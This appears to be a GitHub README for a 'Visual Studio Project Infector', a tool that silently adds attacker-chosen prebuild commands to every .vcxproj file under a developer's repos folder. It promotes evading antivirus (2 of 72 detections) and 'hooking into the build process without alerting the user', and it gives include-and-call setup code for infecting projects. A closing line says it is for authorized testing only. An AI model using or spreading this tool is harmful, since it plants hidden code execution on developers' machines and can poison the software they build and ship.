# Visual Studio Project Infector

> A lightweight, simple infector that plants custom prebuild events into every one of their visual studio projects

---

## 🎯 Overview

This tool **automatically infects a target Visual Studio project** by injecting custom prebuild events into the target's visual studio projects. Some things that makes this project special

- Modifying `.vcxproj` files with custom build events with ease
- Easy and simple to call
- Hooking into the build process without alerting the user
- Undetected on many anti viruses (2/72 as of 2025-6-15)

![screenshot](https://github.com/dwx911/vs-infector/blob/master/vs%20infector/media/detections-2025-6-15.png?raw=true)

Simple to configure, fast to execute, and easy to build off of.

---

## 📦 Features

- 🔧 **Silent modification** of `.vcxproj` files
- ⚡ One-call infection—just include and run
- ✔ Minimal dependencies, fully portable
- 🎥 ![Demo vid](https://github.com/dwx911/vs-infector/blob/master/vs%20infector/media/demo.mp4?raw=true)
 Demo video included!

---

### 🛠️ Setup

1. **Drop the vs infector.h/cpp files** into your project folder:
   - Typically in a subfolder like `\src\infector\`

2. **Include the main header or source file** in your project:

```cpp
#include "vs infector.h"
```

3. **Then either call:**

```cpp
    std::wstring repoDir = getCommonRepoDir(); //use common repo path
    infectProjects(repoDir, L"yourcommandhere!");
    std::wcin.get(); //optional to keep window open
```

**or**

```cpp
    infectProjects(L"C:\\Users\\dwx\\source\\repos", L"yourcommandhere!"); //choose your own path
    std::wcin.get(); //optional to keep window open
```

> ⚠️ This project is for educational and authorized testing purposes only. Do not use it on systems or projects without explicit permission.
